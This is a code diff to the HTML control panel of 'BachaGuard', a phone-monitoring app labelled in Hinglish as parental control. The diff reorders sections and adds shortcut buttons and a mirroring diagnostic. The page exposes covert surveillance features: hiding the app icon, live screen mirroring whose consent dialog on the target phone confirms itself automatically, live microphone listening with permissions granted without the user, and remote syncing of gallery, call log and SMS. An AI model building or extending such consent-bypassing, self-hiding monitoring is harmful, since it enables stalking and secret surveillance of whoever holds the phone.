@@ -9,7 +9,7 @@
 <meta name="theme-color" content="#16A34A">
 <title>BachaGuard — Bachche ke phone ka control</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
-<link rel="stylesheet" href="style.css?v=7">
+<link rel="stylesheet" href="style.css?v=8">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23DC2626' d='M12 2 4 5v6c0 5.25 3.4 10.74 8 12 4.6-1.26 8-6.75 8-12V5l-8-3z'/%3E%3Ccircle fill='%23F1F5F9' cx='12' cy='10' r='3'/%3E%3Cpath fill='%23F1F5F9' d='M8 16c0-2.2 1.8-4 4-4s4 1.8 4 4v1H8z'/%3E%3C/svg%3E">
 </head>
 <body>
@@ -145,6 +145,9 @@
         <button data-cmd="message">💬 Message</button>
         <button data-cmd="show_app_icon">👁 Icon dikhao</button>
         <button data-cmd="hide_app_icon">🫥 Icon chupao</button>
+        <button data-jump="gallery">🖼️ Gallery</button>
+        <button data-jump="calls">☎️ Call log</button>
+        <button data-jump="sms">✉️ SMS</button>
       </div>
 
       <div class="card act-card">
@@ -157,30 +160,23 @@
     <!-- LIVE -->
     <section id="tab-live" class="tab hidden">
       <div class="card amber hidden" id="live-diag" style="font-size:13px"></div>
-      <div class="card">
+      <div class="card" id="sec-mirror">
         <h3>🪞 Live Screen</h3>
         <div class="row">
           <button id="mirror-toggle" class="btn primary">▶ Mirror shuru karo</button>
+          <button id="mirror-diag" class="btn small">🔍 Phone check</button>
           <span id="mirror-fps" class="muted small"></span>
         </div>
+        <div id="mirror-diag-out" class="diag-out small hidden"></div>
         <p id="mirror-status" class="small hidden" style="margin:8px 0 0;color:#B45309;background:#FFFBEB;border:1px solid #FCD34D;border-radius:8px;padding:8px"></p>
         <div id="mirror-wrap"><img id="mirror-img" alt="screen"></div>
-        <p class="muted small">One-time setup: sirf <b>pehli dafa</b> consent aayega (khud confirm ho jata hai). Uske baad seedha screen aayegi — reboot ke baad bhi. Screen aayi par kaali hai? Bachche ka phone screen OFF hoga — ON karte hi frames khud aane lagenge.</p>
+        <p class="muted small">Har mirror start par bachche ke phone par chhota consent dialog khud khulta hai aur khud confirm ho jata hai (2–5 sec) — koi haath nahi lagana. Frames nahi aaye to <b>🔍 Phone check</b> dabao: bachche ka phone khud batayega dikkat kya hai (screen OFF / purana app / permission).</p>
       </div>
       <div class="card hidden" id="media-card">
         <h3>📸 Last capture</h3>
         <img id="media-img" alt="capture">
       </div>
-      <div class="card">
-        <h3>🎧 Live Audio</h3>
-        <div class="row">
-          <button id="audio-toggle" class="btn primary">▶ Sunna shuru karo</button>
-        </div>
-        <p id="audio-status" class="small hidden" style="margin:8px 0 0;color:#B45309;background:#FFFBEB;border:1px solid #FCD34D;border-radius:8px;padding:8px"></p>
-        <div id="audio-viz" class="audio-viz hidden"><span></span><span></span><span></span><span></span><span></span></div>
-        <p class="muted small">Bachche ke phone ka mic live sunno — jaise hi Start dabate ho, awaaz aane lagti hai. Mic permission one-time setup me khud grant ho jati hai.</p>
-      </div>
-      <div class="card">
+      <div class="card" id="sec-gallery">
         <h3>🖼️ Gallery</h3>
         <div class="row">
           <button id="gallery-load" class="btn primary">📸 Gallery kholo</button>
@@ -191,6 +187,15 @@
           <button id="gallery-more" class="btn">⬇ Aur dikhao</button>
         </div>
         <p class="muted small">Bachche ke phone ki latest photos/videos — thumbnails uske phone se live upload hote hain. Kisi photo par tap = bada view. Gallery permission pehli baar auto-Allow ho jati hai.</p>
+      </div>
+      <div class="card" id="sec-audio">
+        <h3>🎧 Live Audio</h3>
+        <div class="row">
+          <button id="audio-toggle" class="btn primary">▶ Sunna shuru karo</button>
+        </div>
+        <p id="audio-status" class="small hidden" style="margin:8px 0 0;color:#B45309;background:#FFFBEB;border:1px solid #FCD34D;border-radius:8px;padding:8px"></p>
+        <div id="audio-viz" class="audio-viz hidden"><span></span><span></span><span></span><span></span><span></span></div>
+        <p class="muted small">Bachche ke phone ka mic live sunno — jaise hi Start dabate ho, awaaz aane lagti hai. Mic permission one-time setup me khud grant ho jati hai.</p>
       </div>
     </section>
 
@@ -210,12 +215,7 @@
     <!-- REPORT -->
     <section id="tab-report" class="tab hidden">
       <div class="card amber hidden" id="perm-diag" style="font-size:13px"></div>
-      <div class="card">
-        <h3>📱 Apps & usage</h3>
-        <p class="muted small">App list bachche ke phone se sync hoti hai. Usage = aaj ka.</p>
-        <div id="apps-list"></div>
-      </div>
-      <div class="card">
+      <div class="card" id="sec-calls">
         <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:6px">
           <h3 style="margin:0">☎️ Call log</h3>
           <button id="logs-sync" class="btn small">🔄 Sync now</button>
@@ -223,9 +223,14 @@
         <p class="muted small" id="logs-hint">Calls bachche ke phone se sync ho kar yahan aate hain.</p>
         <ul id="calls-list" class="feed"></ul>
       </div>
-      <div class="card">
+      <div class="card" id="sec-sms">
         <h3>✉️ SMS</h3>
         <ul id="sms-list" class="feed"></ul>
+      </div>
+      <div class="card">
+        <h3>📱 Apps & usage</h3>
+        <p class="muted small">App list bachche ke phone se sync hoti hai. Usage = aaj ka.</p>
+        <div id="apps-list"></div>
       </div>
     </section>
 
@@ -353,6 +358,6 @@
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="vendor/qrcode.js"></script>
-<script src="app.js?v=11"></script>
+<script src="app.js?v=12"></script>
 </body>
 </html>
